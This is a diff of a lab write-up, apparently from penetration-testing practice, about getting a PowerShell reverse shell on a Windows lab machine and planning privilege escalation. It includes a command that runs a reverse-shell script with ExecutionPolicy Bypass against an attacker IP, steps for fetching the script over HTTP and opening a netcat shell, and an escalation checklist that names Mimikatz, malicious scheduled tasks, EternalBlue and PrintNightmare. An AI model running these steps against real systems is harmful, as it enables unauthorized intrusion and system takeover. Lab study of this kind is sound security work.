@@ -206,8 +206,33 @@ Since attaining a reverse shell back to our attacker machine via metasploit to c
     our revshell has succesfully made it over under revshell.ps1
 
     Now in a separate terminal, we start NetCat and execute the .PS1 file in the semi-interactive instance.
-    C:\Windows\system32>powershell -ExecutionPolicy Bypass -File .\revshell.ps1 192.168.64.129 444
-![image](https://github.com/user-attachments/assets/31cc46ba-6c30-4a1e-9643-3b188f03836c)
-![image](https://github.com/user-attachments/assets/71eba421-2780-496f-be24-c27169cfea24)
+    C:\Windows\system32>powershell -ExecutionPolicy Bypass -File .\revshell.ps1 192.168.64.129 4444  
+    
+![image](https://github.com/user-attachments/assets/31cc46ba-6c30-4a1e-9643-3b188f03836c)  
 
-#### 2.Executing Incognito
+Gaining semi-reverse shell connection with custom .ps1 script.  
+
+![image](https://github.com/user-attachments/assets/71eba421-2780-496f-be24-c27169cfea24)  
+
+'net user' to check the user accounts on the machine  
+'whoami /groups' to check what groups the current user belongs to  
+
+![image](https://github.com/user-attachments/assets/688c2d87-ba99-4cec-bea4-05915b4d8cf4)  
+
+#### 2. Gaining Fully interactive reverse shell into Powershell.  
+
+1. host another SimpleHttp instance with the custom PS reverse shell script on attacking machine.
+2. from the original netcat instance, grab the script and load a secondary netcat instance.
+3. launch the new custom script, type 'powershell' to gain powershell access.
+4. from here, we now have powershell access to further our post compromise. With the local account fcastle, attempt to create a new account with administrative rights.
+5. if this fails, attempt to check what groups / or rights fcastle has from previous initial attack compromises.
+6. if we get completely stuck (we could potentially use administrator with Password1 but this does not solve the escalation part from fcastle).
+   
+**Steps to take for post compromise, privilige escalation attacks:**
+
+        * Enumerate the Current Privileges: Check the groups the current user belongs to and any misconfigured permissions.
+        * Abuse Token Impersonation: Use Mimikatz or similar tools to impersonate higher-privileged users like SYSTEM.
+        * Exploit Misconfigurations: Look for unquoted service paths, weak permissions, or vulnerable services.
+        * Create a Malicious Scheduled Task: Use schtasks to run a task with elevated privileges.
+        * Use PowerShell to Interact with the System: Leverage WMI, scheduled tasks, or other local escalation techniques via PowerShell.
+        * Abuse External Vulnerabilities: Check for EternalBlue, PrintNightmare, or similar exploits.
